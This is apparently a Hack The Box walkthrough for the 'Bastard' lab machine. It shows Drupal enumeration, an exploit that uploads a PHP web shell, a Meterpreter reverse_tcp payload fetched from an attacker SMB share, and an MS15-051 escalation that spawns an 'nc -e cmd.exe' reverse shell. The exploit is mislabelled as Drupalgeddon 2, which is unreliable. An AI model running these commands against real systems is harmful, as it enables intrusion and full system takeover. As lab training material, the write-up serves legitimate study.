# Bastard - Hack The Box Walkthrough

**Target IP**: `10.10.10.9`  
**Hostname**: `bastard.htb`  

---

## Initial Setup

### Preparing the Environment

1. Store the target IP for reuse:
   ```bash
   echo 10.10.10.9 > target
   ```

2. Add the target to your `/etc/hosts`:
   ```
   10.10.10.9   bastard.htb
   ```

---

## Enumeration

### Full Port Scan

Conducted a full TCP port scan to identify open services:

```bash
nmap -p- -v -iL target -oN nmap/full_tcp_scan.txt
```

Identified open ports:
- `80/tcp` – HTTP (Microsoft IIS)
- `135/tcp` – MSRPC
- `49154/tcp` – MSRPC

Then ran a service/version scan on those ports:

```bash
nmap -p80,135,49154 -A -v -iL target -oN nmap/target_ports.txt
```

**Nmap Results:**
```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

---

## Web Enumeration (Port 80)

The site is running **Drupal 7**, confirmed via both Nmap and manually checking:

```bash
curl -s http://bastard.htb/CHANGELOG.txt
```

Also explored:
- [CHANGELOG.txt](http://bastard.htb/CHANGELOG.txt)
- [README.txt](http://bastard.htb/README.txt)

Used `searchsploit` to look for known Drupal 7 vulnerabilities:

```bash
searchsploit Drupal 7
```

Selected and copied the following exploit locally:

```bash
searchsploit -m php/webapps/41564.php
```

---

## Exploiting Drupal (Drupalgeddon 2 - Exploit 41564)

**Payload**: `php/webapps/41564.php` (Drupal REST RCE)

### Configuration

Edit the script to set the correct target details:

```php
$url = 'http://bastard.htb';
$endpoint_path = '/rest'; // discovered via ffuf
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'spread.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

### Finding the REST Endpoint

Used `ffuf` to brute-force directories and discovered the `/rest` endpoint:

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://bastard.htb/FUZZ"
```

Verified using `curl`:

```bash
curl http://bastard.htb/rest
```

### Execute the Exploit

Ensure PHP has cURL support:

```bash
sudo apt install php-curl
```

Then run the exploit:

```bash
php 41564.php
```

A web shell is uploaded as `spread.php`. Verify it works:

```bash
curl "http://bastard.htb/spread.php?cmd=whoami"
```

---

## Gaining a Reverse Shell

### Generate Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your-IP> LPORT=8887 -f exe -o shell.exe
```

### Host Payload

Serve it via SMB:

```bash
impacket-smbserver -ip <Your-IP> shares .
```

### Start Meterpreter Handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Your-IP>
set LPORT 8887
run
```

### Trigger Execution

```bash
curl "http://bastard.htb/spread.php" \
--data-urlencode 'cmd=cmd /c "\\<Your-IP>\shares\shell.exe"'
```

This spawns a Meterpreter session.

---

## Privilege Escalation

### System Information

Gathered with `systeminfo`:

```
OS: Microsoft Windows Server 2008 R2 Datacenter (Build 7600)
Patch Status: No Hotfixes Installed
...
```

Since there are no hotfixes, the target is likely vulnerable to **MS15-051** (Kernel Priv Esc).

### Exploitation: MS15-051

Exploit used: [MS15-051 GitHub Repo](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)

1. Download and extract exploit files.
2. Host the exploit using SMB:

   ```bash
   impacket-smbserver -ip <Your-IP> share .
   ```

3. From the target, test it:

   ```cmd
   \\<Your-IP>\share\ms15-051x64.exe "whoami /all"
   ```

4. Upload `nc.exe` to SMB and spawn a shell:

   Start listener:
   ```bash
   nc -lvnp 443
   ```

   Then from the target:
   ```cmd
   \\<Your-IP>\share\ms15-051x64.exe "\\<Your-IP>\share\nc.exe -e cmd.exe <Your-IP> 443"
   ```

You should now have **SYSTEM** access.

---

## Notes

- Drupalgeddon 2 can be finicky—make sure you find the right endpoint.
- Kernel exploits like MS15-051 are highly reliable on unpatched Win 2008 systems.
- Always clean up after your session if you're working on a shared instance.

---
